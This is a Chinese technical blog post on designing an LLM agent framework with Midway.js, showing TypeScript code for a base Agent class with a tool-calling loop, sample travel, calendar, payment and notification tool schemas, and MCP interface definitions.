<p>那一个基本的LLM应用框架一般怎么设计？本文基于<code>Midwayjs</code>来解读分析。</p>
<h2 data-id="heading-1">Agent&amp;提示词设计</h2>
<h3 data-id="heading-2">基类Agent</h3>
<p>所有<code>Agent</code>都集成于该类，核心触发如下能力。</p>
<ol>
<li>上下文管理；</li>
<li>大模型调用；</li>
<li>提示词注入；</li>
</ol>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// src/agent/base-agent.ts</span>
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">Logger</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">"@midwayjs/core"</span>
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">LLMService</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">"@/service/llm.service"</span>

<span class="hljs-keyword">interface</span> <span class="hljs-title class_">Message</span> {
  <span class="hljs-attr">role</span>: <span class="hljs-string">"system"</span> | <span class="hljs-string">"user"</span> | <span class="hljs-string">"assistant"</span>
  <span class="hljs-attr">content</span>: <span class="hljs-built_in">string</span>
}

<span class="hljs-keyword">interface</span> <span class="hljs-title class_">ToolCall</span> {
  <span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span>
  <span class="hljs-attr">arguments</span>: <span class="hljs-title class_">Record</span>&lt;<span class="hljs-built_in">string</span>, <span class="hljs-built_in">any</span>&gt;
  id?: <span class="hljs-built_in">string</span>
}

<span class="hljs-comment">/**
 * Agent 基类
 * 所有 Agent 都继承这个基类
 */</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">BaseAgent</span> {
  <span class="hljs-meta">@Logger</span>()
  <span class="hljs-attr">logger</span>: <span class="hljs-built_in">any</span>

  <span class="hljs-keyword">protected</span> <span class="hljs-attr">llmService</span>: <span class="hljs-title class_">LLMService</span>
  <span class="hljs-keyword">protected</span> <span class="hljs-attr">conversationHistory</span>: <span class="hljs-title class_">Message</span>[] = []

  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">llmService: LLMService</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">llmService</span> = llmService
  }

  <span class="hljs-comment">/**
   * 初始化 Agent
   * 1. 设置系统提示词
   * 2. 注入工具定义
   * 3. 初始化对话历史
   */</span>
  <span class="hljs-keyword">protected</span> <span class="hljs-title function_">initializeAgent</span>(
    <span class="hljs-attr">systemPrompt</span>: <span class="hljs-built_in">string</span>,
    <span class="hljs-attr">tools</span>: <span class="hljs-built_in">any</span>[]
  ): <span class="hljs-built_in">void</span> {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">logger</span>.<span class="hljs-title function_">info</span>(<span class="hljs-string">`[<span class="hljs-subst">${<span class="hljs-variable language_">this</span>.getAgentName()}</span>] 初始化 Agent`</span>)

    <span class="hljs-comment">// Step 1: 清空历史对话</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">conversationHistory</span> = []

    <span class="hljs-comment">// Step 2: 添加系统提示词</span>
    <span class="hljs-keyword">const</span> enrichedSystemPrompt = <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">enrichSystemPrompt</span>(
      systemPrompt,
      tools
    )

    <span class="hljs-variable language_">this</span>.<span class="hljs-property">conversationHistory</span>.<span class="hljs-title function_">push</span>({
      <span class="hljs-attr">role</span>: <span class="hljs-string">"system"</span>,
      <span class="hljs-attr">content</span>: enrichedSystemPrompt,
    })

    <span class="hljs-variable language_">this</span>.<span class="hljs-property">logger</span>.<span class="hljs-title function_">info</span>(
      <span class="hljs-string">`[<span class="hljs-subst">${<span class="hljs-variable language_">this</span>.getAgentName()}</span>] Agent 初始化完成，已注入 <span class="hljs-subst">${tools.length}</span> 个工具`</span>
    )
  }

  <span class="hljs-comment">/**
   * 增强系统提示词（注入工具定义）
   */</span>
  <span class="hljs-keyword">private</span> <span class="hljs-title function_">enrichSystemPrompt</span>(<span class="hljs-attr">systemPrompt</span>: <span class="hljs-built_in">string</span>, <span class="hljs-attr">tools</span>: <span class="hljs-built_in">any</span>[]): <span class="hljs-built_in">string</span> {
    <span class="hljs-keyword">const</span> toolDescriptions = tools
      .<span class="hljs-title function_">map</span>(
        <span class="hljs-function">(<span class="hljs-params">tool</span>) =&gt;</span> <span class="hljs-string">`
### 工具：<span class="hljs-subst">${tool.name}</span>
描述：<span class="hljs-subst">${tool.description}</span>
参数：<span class="hljs-subst">${<span class="hljs-built_in">JSON</span>.stringify(tool.parameters, <span class="hljs-literal">null</span>, <span class="hljs-number">2</span>)}</span>
`</span>
      )
      .<span class="hljs-title function_">join</span>(<span class="hljs-string">"\n"</span>)

    <span class="hljs-keyword">return</span> <span class="hljs-string">`
<span class="hljs-subst">${systemPrompt}</span>

## 可用的工具

<span class="hljs-subst">${toolDescriptions}</span>

## 工具调用格式

当你需要使用工具时，请返回以下 JSON 格式：
\`\`\`json
{
  "type": "tool_call",
  "tool_name": "工具名称",
  "arguments": {
    "参数1": "值1",
    "参数2": "值2"
  }
}
\`\`\`

重要：
1. 每次只调用一个工具
2. 工具会返回结果，你会收到 "tool_result" 角色的消息
3. 根据工具结果继续推理和决策
4. 最终向用户返回友好的文字回复
`</span>
  }

  <span class="hljs-comment">/**
   * 与大模型交互（核心方法）
   */</span>
  <span class="hljs-keyword">async</span> <span class="hljs-title function_">callLLM</span>(<span class="hljs-attr">userMessage</span>: <span class="hljs-built_in">string</span>): <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-built_in">string</span>&gt; {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">logger</span>.<span class="hljs-title function_">info</span>(
      <span class="hljs-string">`[<span class="hljs-subst">${<span class="hljs-variable language_">this</span>.getAgentName()}</span>] 用户消息: <span class="hljs-subst">${userMessage}</span>`</span>
    )

    <span class="hljs-comment">// 1. 添加用户消息到历史</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">conversationHistory</span>.<span class="hljs-title function_">push</span>({
      <span class="hljs-attr">role</span>: <span class="hljs-string">"user"</span>,
      <span class="hljs-attr">content</span>: userMessage,
    })

    <span class="hljs-comment">// 2. 调用大模型</span>
    <span class="hljs-keyword">let</span> response = <span class="hljs-keyword">await</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">llmService</span>.<span class="hljs-title function_">call</span>({
      <span class="hljs-attr">model</span>: <span class="hljs-string">"gpt-4"</span>,
      <span class="hljs-attr">messages</span>: <span class="hljs-variable language_">this</span>.<span class="hljs-property">conversationHistory</span>,
      <span class="hljs-attr">temperature</span>: <span class="hljs-number">0.7</span>,
      <span class="hljs-attr">maxTokens</span>: <span class="hljs-number">2000</span>,
    })

    <span class="hljs-variable language_">this</span>.<span class="hljs-property">logger</span>.<span class="hljs-title function_">info</span>(
      <span class="hljs-string">`[<span class="hljs-subst">${<span class="hljs-variable language_">this</span>.getAgentName()}</span>] 模型响应: <span class="hljs-subst">${response.content.substring(<span class="hljs-number">0</span>, <span class="hljs-number">100</span>)}</span>...`</span>
    )

    <span class="hljs-comment">// 3. 检查是否是工具调用</span>
    <span class="hljs-keyword">let</span> finalResponse = response.<span class="hljs-property">content</span>
    <span class="hljs-keyword">let</span> toolCalls = <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">extractToolCalls</span>(response.<span class="hljs-property">content</span>)

    <span class="hljs-comment">// 4. 如果有工具调用，递归执行直到没有工具调用</span>
    <span class="hljs-keyword">while</span> (toolCalls.<span class="hljs-property">length</span> &gt; <span class="hljs-number">0</span>) {
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">logger</span>.<span class="hljs-title function_">info</span>(
        <span class="hljs-string">`[<span class="hljs-subst">${<span class="hljs-variable language_">this</span>.getAgentName()}</span>] 检测到工具调用: <span class="hljs-subst">${toolCalls.map((t) =&gt; t.name).join(<span class="hljs-string">", "</span>)}</span>`</span>
      )

      <span class="hljs-comment">// 添加助手的响应到历史</span>
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">conversationHistory</span>.<span class="hljs-title function_">push</span>({
        <span class="hljs-attr">role</span>: <span class="hljs-string">"assistant"</span>,
        <span class="hljs-attr">content</span>: response.<span class="hljs-property">content</span>,
      })

      <span class="hljs-comment">// 执行所有工具调用</span>
      <span class="hljs-keyword">const</span> toolResults = <span class="hljs-keyword">await</span> <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">all</span>(
        toolCalls.<span class="hljs-title function_">map</span>(<span class="hljs-function">(<span class="hljs-params">call</span>) =&gt;</span>
          <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">executeTool</span>(call.<span class="hljs-property">name</span>, call.<span class="hljs-property">arguments</span>)
        )
      )

      <span class="hljs-comment">// 5. 将工具结果添加到历史</span>
      <span class="hljs-keyword">const</span> toolResultMessage = toolResults
        .<span class="hljs-title function_">map</span>(
          <span class="hljs-function">(<span class="hljs-params">result, index</span>) =&gt;</span> <span class="hljs-string">`
[工具结果 <span class="hljs-subst">${index + <span class="hljs-number">1</span>}</span>]
工具：<span class="hljs-subst">${toolCalls[index].name}</span>
参数：<span class="hljs-subst">${<span class="hljs-built_in">JSON</span>.stringify(toolCalls[index].<span class="hljs-variable language_">arguments</span>)}</span>
结果：<span class="hljs-subst">${<span class="hljs-built_in">JSON</span>.stringify(result, <span class="hljs-literal">null</span>, <span class="hljs-number">2</span>)}</span>
`</span>
        )
        .<span class="hljs-title function_">join</span>(<span class="hljs-string">"\n"</span>)

      <span class="hljs-variable language_">this</span>.<span class="hljs-property">conversationHistory</span>.<span class="hljs-title function_">push</span>({
        <span class="hljs-attr">role</span>: <span class="hljs-string">"user"</span>,
        <span class="hljs-attr">content</span>: <span class="hljs-string">`工具执行结果：\n<span class="hljs-subst">${toolResultMessage}</span>`</span>,
      })

      <span class="hljs-variable language_">this</span>.<span class="hljs-property">logger</span>.<span class="hljs-title function_">info</span>(
        <span class="hljs-string">`[<span class="hljs-subst">${<span class="hljs-variable language_">this</span>.getAgentName()}</span>] 工具执行完成，继续推理...`</span>
      )

      <span class="hljs-comment">// 6. 再次调用大模型，让它基于工具结果继续推理</span>
      response = <span class="hljs-keyword">await</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">llmService</span>.<span class="hljs-title function_">call</span>({
        <span class="hljs-attr">model</span>: <span class="hljs-string">"gpt-4"</span>,
        <span class="hljs-attr">messages</span>: <span class="hljs-variable language_">this</span>.<span class="hljs-property">conversationHistory</span>,
        <span class="hljs-attr">temperature</span>: <span class="hljs-number">0.7</span>,
        <span class="hljs-attr">maxTokens</span>: <span class="hljs-number">2000</span>,
      })

      <span class="hljs-variable language_">this</span>.<span class="hljs-property">logger</span>.<span class="hljs-title function_">info</span>(
        <span class="hljs-string">`[<span class="hljs-subst">${<span class="hljs-variable language_">this</span>.getAgentName()}</span>] 后续模型响应: <span class="hljs-subst">${response.content.substring(<span class="hljs-number">0</span>, <span class="hljs-number">100</span>)}</span>...`</span>
      )

      <span class="hljs-comment">// 7. 再次检查是否有工具调用</span>
      toolCalls = <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">extractToolCalls</span>(response.<span class="hljs-property">content</span>)
      finalResponse = response.<span class="hljs-property">content</span>
    }

    <span class="hljs-comment">// 8. 添加最终回复到历史</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">conversationHistory</span>.<span class="hljs-title function_">push</span>({
      <span class="hljs-attr">role</span>: <span class="hljs-string">"assistant"</span>,
      <span class="hljs-attr">content</span>: finalResponse,
    })

    <span class="hljs-keyword">return</span> finalResponse
  }

  <span class="hljs-comment">/**
   * 提取工具调用（从模型响应中）
   */</span>
  <span class="hljs-keyword">private</span> <span class="hljs-title function_">extractToolCalls</span>(<span class="hljs-attr">content</span>: <span class="hljs-built_in">string</span>): <span class="hljs-title class_">ToolCall</span>[] {
    <span class="hljs-keyword">const</span> <span class="hljs-attr">toolCalls</span>: <span class="hljs-title class_">ToolCall</span>[] = []

    <span class="hljs-comment">// 匹配 JSON 格式的工具调用</span>
    <span class="hljs-keyword">const</span> jsonMatches = content.<span class="hljs-title function_">match</span>(<span class="hljs-regexp">/```json\n([\s\S]*?)\n```/g</span>)

    <span class="hljs-keyword">if</span> (jsonMatches) {
      jsonMatches.<span class="hljs-title function_">forEach</span>(<span class="hljs-function">(<span class="hljs-params">match</span>) =&gt;</span> {
        <span class="hljs-keyword">try</span> {
          <span class="hljs-keyword">const</span> json = match.<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/```json\n/g</span>, <span class="hljs-string">""</span>).<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/\n```/g</span>, <span class="hljs-string">""</span>)
          <span class="hljs-keyword">const</span> parsed = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(json)

          <span class="hljs-keyword">if</span> (parsed.<span class="hljs-property">type</span> === <span class="hljs-string">"tool_call"</span>) {
            toolCalls.<span class="hljs-title function_">push</span>({
              <span class="hljs-attr">name</span>: parsed.<span class="hljs-property">tool_name</span>,
              <span class="hljs-attr">arguments</span>: parsed.<span class="hljs-property">arguments</span>,
            })
          }
        } <span class="hljs-keyword">catch</span> (error) {
          <span class="hljs-variable language_">this</span>.<span class="hljs-property">logger</span>.<span class="hljs-title function_">warn</span>(<span class="hljs-string">`[<span class="hljs-subst">${<span class="hljs-variable language_">this</span>.getAgentName()}</span>] 无法解析 JSON: <span class="hljs-subst">${match}</span>`</span>)
        }
      })
    }

    <span class="hljs-keyword">return</span> toolCalls
  }

  <span class="hljs-comment">/**
   * 执行工具（由子类实现）
   */</span>
  <span class="hljs-keyword">protected</span> <span class="hljs-keyword">abstract</span> <span class="hljs-title function_">executeTool</span>(
    <span class="hljs-attr">toolName</span>: <span class="hljs-built_in">string</span>,
    <span class="hljs-attr">arguments</span>: <span class="hljs-title class_">Record</span>&lt;<span class="hljs-built_in">string</span>, <span class="hljs-built_in">any</span>&gt;
  ): <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-built_in">any</span>&gt;

  <span class="hljs-comment">/**
   * 获取 Agent 名称
   */</span>
  <span class="hljs-keyword">protected</span> <span class="hljs-keyword">abstract</span> <span class="hljs-title function_">getAgentName</span>(): <span class="hljs-built_in">string</span>
}

</code></pre>
<h3 data-id="heading-3">工具定义&amp;设计</h3>
<p>工具定义核心是基于约定式的配置体，来提供给大模型。</p>
<p>这些工具可以是<code>mcp</code>，可以是<code>function call</code>，在工具中增加<code>type</code>即可扩展。</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// src/tools/travel-tools.ts</span>

<span class="hljs-comment">/**
 * 差旅工具定义
 * 这些工具会被注入到 Agent 的提示词中
 */</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">TRAVEL_TOOLS</span> = [
  {
    <span class="hljs-attr">name</span>: <span class="hljs-string">"search_flights"</span>,
    <span class="hljs-attr">description</span>: <span class="hljs-string">"搜索机票，返回可用的航班列表"</span>,
    <span class="hljs-attr">parameters</span>: {
      <span class="hljs-attr">type</span>: <span class="hljs-string">"object"</span>,
      <span class="hljs-attr">properties</span>: {
        <span class="hljs-attr">from</span>: {
          <span class="hljs-attr">type</span>: <span class="hljs-string">"string"</span>,
          <span class="hljs-attr">description</span>: <span class="hljs-string">"出发城市（如：北京、上海）"</span>,
        },
        <span class="hljs-attr">to</span>: {
          <span class="hljs-attr">type</span>: <span class="hljs-string">"string"</span>,
          <span class="hljs-attr">description</span>: <span class="hljs-string">"目的城市"</span>,
        },
        <span class="hljs-attr">date</span>: {
          <span class="hljs-attr">type</span>: <span class="hljs-string">"string"</span>,
          <span class="hljs-attr">description</span>: <span class="hljs-string">"出发日期（格式：YYYY-MM-DD）"</span>,
        },
        <span class="hljs-attr">return_date</span>: {
          <span class="hljs-attr">type</span>: <span class="hljs-string">"string"</span>,
          <span class="hljs-attr">description</span>: <span class="hljs-string">"返回日期（可选，格式：YYYY-MM-DD）"</span>,
        },
      },
      <span class="hljs-attr">required</span>: [<span class="hljs-string">"from"</span>, <span class="hljs-string">"to"</span>, <span class="hljs-string">"date"</span>],
    },
  },
  {
    <span class="hljs-attr">name</span>: <span class="hljs-string">"search_hotels"</span>,
    <span class="hljs-attr">description</span>: <span class="hljs-string">"搜索酒店，返回可用的酒店列表"</span>,
    <span class="hljs-attr">parameters</span>: {
      <span class="hljs-attr">type</span>: <span class="hljs-string">"object"</span>,
      <span class="hljs-attr">properties</span>: {
        <span class="hljs-attr">city</span>: {
          <span class="hljs-attr">type</span>: <span class="hljs-string">"string"</span>,
          <span class="hljs-attr">description</span>: <span class="hljs-string">"目的城市"</span>,
        },
        <span class="hljs-attr">check_in</span>: {
          <span class="hljs-attr">type</span>: <span class="hljs-string">"string"</span>,
          <span class="hljs-attr">description</span>: <span class="hljs-string">"入住日期（格式：YYYY-MM-DD）"</span>,
        },
        <span class="hljs-attr">check_out</span>: {
          <span class="hljs-attr">type</span>: <span class="hljs-string">"string"</span>,
          <span class="hljs-attr">description</span>: <span class="hljs-string">"退房日期（格式：YYYY-MM-DD）"</span>,
        },
        <span class="hljs-attr">max_price</span>: {
          <span class="hljs-attr">type</span>: <span class="hljs-string">"number"</span>,
          <span class="hljs-attr">description</span>: <span class="hljs-string">"最高价格（可选，单位：元）"</span>,
        },
      },
      <span class="hljs-attr">required</span>: [<span class="hljs-string">"city"</span>, <span class="hljs-string">"check_in"</span>, <span class="hljs-string">"check_out"</span>],
    },
  },
  {
    <span class="hljs-attr">name</span>: <span class="hljs-string">"book_trip"</span>,
    <span class="hljs-attr">description</span>: <span class="hljs-string">"预订机票和酒店，返回订单号"</span>,
    <span class="hljs-attr">parameters</span>: {
      <span class="hljs-attr">type</span>: <span class="hljs-string">"object"</span>,
      <span class="hljs-attr">properties</span>: {
        <span class="hljs-attr">flight_id</span>: {
          <span class="hljs-attr">type</span>: <span class="hljs-string">"string"</span>,
          <span class="hljs-attr">description</span>: <span class="hljs-string">"航班 ID"</span>,
        },
        <span class="hljs-attr">hotel_id</span>: {
          <span class="hljs-attr">type</span>: <span class="hljs-string">"string"</span>,
          <span class="hljs-attr">description</span>: <span class="hljs-string">"酒店 ID"</span>,
        },
        <span class="hljs-attr">passengers</span>: {
          <span class="hljs-attr">type</span>: <span class="hljs-string">"number"</span>,
          <span class="hljs-attr">description</span>: <span class="hljs-string">"乘客人数"</span>,
        },
      },
      <span class="hljs-attr">required</span>: [<span class="hljs-string">"flight_id"</span>, <span class="hljs-string">"hotel_id"</span>],
    },
  },
  {
    <span class="hljs-attr">name</span>: <span class="hljs-string">"get_trip_details"</span>,
    <span class="hljs-attr">description</span>: <span class="hljs-string">"获取已预订差旅的详细信息"</span>,
    <span class="hljs-attr">parameters</span>: {
      <span class="hljs-attr">type</span>: <span class="hljs-string">"object"</span>,
      <span class="hljs-attr">properties</span>: {
        <span class="hljs-attr">trip_id</span>: {
          <span class="hljs-attr">type</span>: <span class="hljs-string">"string"</span>,
          <span class="hljs-attr">description</span>: <span class="hljs-string">"订单号"</span>,
        },
      },
      <span class="hljs-attr">required</span>: [<span class="hljs-string">"trip_id"</span>],
    },
  },
  {
    <span class="hljs-attr">name</span>: <span class="hljs-string">"cancel_trip"</span>,
    <span class="hljs-attr">description</span>: <span class="hljs-string">"取消已预订的差旅"</span>,
    <span class="hljs-attr">parameters</span>: {
      <span class="hljs-attr">type</span>: <span class="hljs-string">"object"</span>,
      <span class="hljs-attr">properties</span>: {
        <span class="hljs-attr">trip_id</span>: {
          <span class="hljs-attr">type</span>: <span class="hljs-string">"string"</span>,
          <span class="hljs-attr">description</span>: <span class="hljs-string">"订单号"</span>,
        },
        <span class="hljs-attr">reason</span>: {
          <span class="hljs-attr">type</span>: <span class="hljs-string">"string"</span>,
          <span class="hljs-attr">description</span>: <span class="hljs-string">"取消原因（可选）"</span>,
        },
      },
      <span class="hljs-attr">required</span>: [<span class="hljs-string">"trip_id"</span>],
    },
  },
]

<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">CALENDAR_TOOLS</span> = [
  {
    <span class="hljs-attr">name</span>: <span class="hljs-string">"add_calendar_event"</span>,
    <span class="hljs-attr">description</span>: <span class="hljs-string">"添加日历事件"</span>,
    <span class="hljs-attr">parameters</span>: {
      <span class="hljs-attr">type</span>: <span class="hljs-string">"object"</span>,
      <span class="hljs-attr">properties</span>: {
        <span class="hljs-attr">title</span>: {
          <span class="hljs-attr">type</span>: <span class="hljs-string">"string"</span>,
          <span class="hljs-attr">description</span>: <span class="hljs-string">"事件标题"</span>,
        },
        <span class="hljs-attr">start_date</span>: {
          <span class="hljs-attr">type</span>: <span class="hljs-string">"string"</span>,
          <span class="hljs-attr">description</span>: <span class="hljs-string">"开始时间（格式：YYYY-MM-DD HH:mm）"</span>,
        },
        <span class="hljs-attr">end_date</span>: {
          <span class="hljs-attr">type</span>: <span class="hljs-string">"string"</span>,
          <span class="hljs-attr">description</span>: <span class="hljs-string">"结束时间（格式：YYYY-MM-DD HH:mm）"</span>,
        },
        <span class="hljs-attr">description</span>: {
          <span class="hljs-attr">type</span>: <span class="hljs-string">"string"</span>,
          <span class="hljs-attr">description</span>: <span class="hljs-string">"事件描述"</span>,
        },
      },
      <span class="hljs-attr">required</span>: [<span class="hljs-string">"title"</span>, <span class="hljs-string">"start_date"</span>, <span class="hljs-string">"end_date"</span>],
    },
  },
  {
    <span class="hljs-attr">name</span>: <span class="hljs-string">"get_calendar_events"</span>,
    <span class="hljs-attr">description</span>: <span class="hljs-string">"查询特定日期的日历事件"</span>,
    <span class="hljs-attr">parameters</span>: {
      <span class="hljs-attr">type</span>: <span class="hljs-string">"object"</span>,
      <span class="hljs-attr">properties</span>: {
        <span class="hljs-attr">date</span>: {
          <span class="hljs-attr">type</span>: <span class="hljs-string">"string"</span>,
          <span class="hljs-attr">description</span>: <span class="hljs-string">"查询日期（格式：YYYY-MM-DD）"</span>,
        },
      },
      <span class="hljs-attr">required</span>: [<span class="hljs-string">"date"</span>],
    },
  },
]

<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">PAYMENT_TOOLS</span> = [
  {
    <span class="hljs-attr">name</span>: <span class="hljs-string">"process_payment"</span>,
    <span class="hljs-attr">description</span>: <span class="hljs-string">"处理支付请求"</span>,
    <span class="hljs-attr">parameters</span>: {
      <span class="hljs-attr">type</span>: <span class="hljs-string">"object"</span>,
      <span class="hljs-attr">properties</span>: {
        <span class="hljs-attr">order_id</span>: {
          <span class="hljs-attr">type</span>: <span class="hljs-string">"string"</span>,
          <span class="hljs-attr">description</span>: <span class="hljs-string">"订单号"</span>,
        },
        <span class="hljs-attr">amount</span>: {
          <span class="hljs-attr">type</span>: <span class="hljs-string">"number"</span>,
          <span class="hljs-attr">description</span>: <span class="hljs-string">"金额（单位：元）"</span>,
        },
        <span class="hljs-attr">payment_method</span>: {
          <span class="hljs-attr">type</span>: <span class="hljs-string">"string"</span>,
          <span class="hljs-attr">enum</span>: [<span class="hljs-string">"credit_card"</span>, <span class="hljs-string">"debit_card"</span>, <span class="hljs-string">"wechat"</span>, <span class="hljs-string">"alipay"</span>],
          <span class="hljs-attr">description</span>: <span class="hljs-string">"支付方式"</span>,
        },
      },
      <span class="hljs-attr">required</span>: [<span class="hljs-string">"order_id"</span>, <span class="hljs-string">"amount"</span>, <span class="hljs-string">"payment_method"</span>],
    },
  },
]

<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">ALERT_TOOLS</span> = [
  {
    <span class="hljs-attr">name</span>: <span class="hljs-string">"send_notification"</span>,
    <span class="hljs-attr">description</span>: <span class="hljs-string">"发送通知给用户"</span>,
    <span class="hljs-attr">parameters</span>: {
      <span class="hljs-attr">type</span>: <span class="hljs-string">"object"</span>,
      <span class="hljs-attr">properties</span>: {
        <span class="hljs-attr">title</span>: {
          <span class="hljs-attr">type</span>: <span class="hljs-string">"string"</span>,
          <span class="hljs-attr">description</span>: <span class="hljs-string">"通知标题"</span>,
        },
        <span class="hljs-attr">content</span>: {
          <span class="hljs-attr">type</span>: <span class="hljs-string">"string"</span>,
          <span class="hljs-attr">description</span>: <span class="hljs-string">"通知内容"</span>,
        },
        <span class="hljs-attr">channels</span>: {
          <span class="hljs-attr">type</span>: <span class="hljs-string">"array"</span>,
          <span class="hljs-attr">items</span>: { <span class="hljs-attr">type</span>: <span class="hljs-string">"string"</span>, <span class="hljs-attr">enum</span>: [<span class="hljs-string">"email"</span>, <span class="hljs-string">"sms"</span>, <span class="hljs-string">"app"</span>] },
          <span class="hljs-attr">description</span>: <span class="hljs-string">"通知渠道"</span>,
        },
      },
      <span class="hljs-attr">required</span>: [<span class="hljs-string">"title"</span>, <span class="hljs-string">"content"</span>, <span class="hljs-string">"channels"</span>],
    },
  },
]

</code></pre>
<h3 data-id="heading-4">MCP设计</h3>
<p><code>Agent</code>基于多个<code>Mcp</code>能力的提供从而实现更垂直的领域能力。</p>
<p>因此<code>Mcp</code>也可以单独设计出来。</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// src/mcp/types.ts</span>

<span class="hljs-comment">/**
 * MCP 工具定义
 */</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">MCPTool</span> {
  <span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span>
  <span class="hljs-attr">description</span>: <span class="hljs-built_in">string</span>
  <span class="hljs-attr">inputSchema</span>: {
    <span class="hljs-attr">type</span>: <span class="hljs-string">"object"</span>
    <span class="hljs-attr">properties</span>: <span class="hljs-title class_">Record</span>&lt;<span class="hljs-built_in">string</span>, <span class="hljs-built_in">any</span>&gt;
    <span class="hljs-attr">required</span>: <span class="hljs-built_in">string</span>[]
  }
}

<span class="hljs-comment">/**
 * MCP 资源定义
 */</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">MCPResource</span> {
  <span class="hljs-attr">uri</span>: <span class="hljs-built_in">string</span>
  <span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span>
  <span class="hljs-attr">description</span>: <span class="hljs-built_in">string</span>
  <span class="hljs-attr">mimeType</span>: <span class="hljs-built_in">string</span>
  <span class="hljs-attr">contents</span>: <span class="hljs-built_in">string</span>
}

<span class="hljs-comment">/**
 * MCP 提示词定义
 */</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">MCPPrompt</span> {
  <span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span>
  <span class="hljs-attr">description</span>: <span class="hljs-built_in">string</span>
  <span class="hljs-variable language_">arguments</span>?: <span class="hljs-title class_">Array</span>&lt;{
    <span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span>
    <span class="hljs-attr">description</span>: <span class="hljs-built_in">string</span>
    required?: <span class="hljs-built_in">boolean</span>
  }&gt;
}

<span class="hljs-comment">/**
 * MCP 工具调用请求
 */</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">MCPToolCallRequest</span> {
  <span class="hljs-attr">toolName</span>: <span class="hljs-built_in">string</span>
  <span class="hljs-attr">arguments</span>: <span class="hljs-title class_">Record</span>&lt;<span class="hljs-built_in">string</span>, <span class="hljs-built_in">any</span>&gt;
}

<span class="hljs-comment">/**
 * MCP 工具执行结果
 */</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">MCPToolResult</span> {
  <span class="hljs-attr">success</span>: <span class="hljs-built_in">boolean</span>
  data?: <span class="hljs-built_in">any</span>
  error?: <span class="hljs-built_in">string</span>
}

<span class="hljs-comment">/**
 * MCP 服务器接口
 */</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">IMCPServer</span> {
  <span class="hljs-comment">// 获取服务器信息</span>
  <span class="hljs-title function_">getServerInfo</span>(): <span class="hljs-title class_">Promise</span>&lt;{
    <span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span>
    <span class="hljs-attr">version</span>: <span class="hljs-built_in">string</span>
    <span class="hljs-attr">capabilities</span>: <span class="hljs-built_in">string</span>[]
  }&gt;

  <span class="hljs-comment">// 列出所有可用工具</span>
  <span class="hljs-title function_">listTools</span>(): <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-title class_">MCPTool</span>[]&gt;

  <span class="hljs-comment">// 执行工具</span>
  <span class="hljs-title function_">callTool</span>(<span class="hljs-attr">request</span>: <span class="hljs-title class_">MCPToolCallRequest</span>): <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-title class_">MCPToolResult</span>&gt;

  <span class="hljs-comment">// 列出所有可用资源</span>
  <span class="hljs-title function_">listResources</span>(): <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-title class_">MCPResource</span>[]&gt;

  <span class="hljs-comment">// 获取资源内容</span>
  <span class="hljs-title function_">getResource</span>(<span class="hljs-attr">uri</span>: <span class="hljs-built_in">string</span>): <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-title class_">MCPResource</span>&gt;

  <span class="hljs-comment">// 列出所有可用提示词</span>
  <span class="hljs-title function_">listPrompts</span>(): <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-title class_">MCPPrompt</span>[]&gt;

  <span class="hljs-comment">// 获取提示词内容</span>
  <span class="hljs-title function_">getPrompt</span>(<span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span>, <span class="hljs-variable language_">arguments</span>?: <span class="hljs-title class_">Record</span>&lt;<span class="hljs-built_in">string</span>, <span class="hljs-built_in">string</span>&gt;): <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-built_in">string</span>&gt;
}

</code></pre>
